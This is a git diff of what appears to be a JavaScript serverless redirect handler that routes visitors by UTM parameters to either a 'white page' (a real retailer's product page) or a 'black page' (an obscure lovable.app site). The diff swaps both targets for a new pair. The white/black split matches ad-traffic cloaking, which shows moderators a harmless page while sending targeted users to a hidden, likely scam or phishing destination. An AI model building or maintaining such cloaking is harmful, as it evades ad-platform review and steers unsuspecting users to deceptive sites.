@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.asterandoak.com.au/products/native-animals-5-piece-gift-set-white?variant=42464817840225";
-    const blackPageURL = "https://csshhpluv.lovable.app/";
+    const whitePageURL = "https://www.toysngeek.co.uk/products/just-one-party-game";
+    const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
